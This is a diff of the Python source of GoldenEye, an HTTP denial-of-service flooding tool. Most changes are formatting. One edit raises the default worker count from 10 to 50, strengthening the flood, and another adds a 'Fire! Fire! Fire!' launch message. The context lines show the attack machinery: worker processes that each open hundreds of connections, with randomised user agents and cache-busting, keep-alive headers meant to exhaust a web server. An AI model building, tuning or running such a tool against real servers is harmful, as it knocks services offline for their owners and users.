@@ -63,17 +63,18 @@ SSLVERIFY = True
 ####
 # Constants
 ####
-METHOD_GET  = 'get'
+METHOD_GET = 'get'
 METHOD_POST = 'post'
 METHOD_RAND = 'random'
 
-JOIN_TIMEOUT=1.0
+JOIN_TIMEOUT = 1.0
 
-DEFAULT_WORKERS=10
-DEFAULT_SOCKETS=500
+DEFAULT_WORKERS = 50
+DEFAULT_SOCKETS = 500
 
 GOLDENEYE_BANNER = 'GoldenEye v2.1 by Jan Seidl <jseidl@wroot.org>'
 
+# <editor-fold defaultstate="collapsed" desc="User-Agent">
 USER_AGENT_PARTS = {
     'os': {
         'linux': {
@@ -109,6 +110,7 @@ USER_AGENT_PARTS = {
         }
     }
 }
+# </editor-fold>
 
 ####
 # GoldenEye Class
@@ -145,7 +147,6 @@ class GoldenEye(object):
         # Initialize Counters
         self.counter = self.manager.list((0, 0))
 
-
     def exit(self):
         self.stats()
         print "Shutting down GoldenEye"
@@ -164,14 +165,14 @@ class GoldenEye(object):
     def fire(self):
 
         self.printHeader()
-        print "Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets)
+        print "Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel."\
+            .format(self.method, self.nr_workers, self.nr_sockets)
 
         if DEBUG:
             print "Starting {0} concurrent workers".format(self.nr_workers)
 
         # Start workers
         for i in range(int(self.nr_workers)):
-
             try:
 
                 worker = Striker(self.url, self.nr_sockets, self.counter)
@@ -189,7 +190,6 @@ class GoldenEye(object):
         self.monitor()
 
     def stats(self):
-
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
@@ -220,7 +220,7 @@ class GoldenEye(object):
                     try:
                         if DEBUG:
                             print "Killing worker {0}".format(worker.name)
-                        #worker.terminate()
+                        # worker.terminate()
                         worker.stop()
                     except Exception, ex:
                         pass # silently ignore
@@ -233,9 +233,9 @@ class GoldenEye(object):
 # Striker Class
 ####
 
+
 class Striker(Process):
 
-        
     # Counters
     request_count = 0
     failed_count = 0
@@ -286,12 +286,10 @@ class Striker(Process):
             'http://' + self.host + '/'
             ]
 
-
     def __del__(self):
         self.stop()
 
-
-    #builds random ascii string
+    # builds random ascii string
     def buildblock(self, size):
         out_str = ''
 
@@ -307,9 +305,7 @@ class Striker(Process):
 
         return out_str
 
-
     def run(self):
-
         if DEBUG:
             print "Starting worker {0}".format(self.name)
 
@@ -343,7 +339,7 @@ class Striker(Process):
                     self.incCounter()
 
                 self.closeConnections()
-                
+
             except:
                 self.incFailed()
                 if DEBUG:
@@ -360,7 +356,6 @@ class Striker(Process):
                 conn.close()
             except:
                 pass # silently ignore
-            
 
     def createPayload(self):
 
@@ -480,7 +475,7 @@ class Striker(Process):
             'Cache-Control': noCache,
             'Accept-Encoding': ', '.join(roundEncodings),
             'Connection': 'keep-alive',
-            'Keep-Alive': random.randint(1,1000),
+            'Keep-Alive': random.randint(1, 1000),
             'Host': self.host,
         }
     
@@ -535,7 +530,6 @@ class Striker(Process):
             pass
         
 
-
 ####
 
 ####
@@ -572,6 +566,7 @@ def error(msg):
 ####
 # Main
 ####
+
 
 def main():
     
@@ -625,7 +620,6 @@ def main():
             else:
                 error("option '"+o+"' doesn't exists")
 
-
         if uas_file:
             try:
                 with open(uas_file) as f:
@@ -639,6 +633,7 @@ def main():
         goldeneye.method = method
         goldeneye.nr_sockets = socks
 
+        print 'Fire! Fire! Fire!'
         goldeneye.fire()
 
     except getopt.GetoptError, err:
@@ -647,6 +642,7 @@ def main():
         sys.stderr.write(str(err))
         usage()
         sys.exit(2)
+
 
 if __name__ == "__main__":
     main()
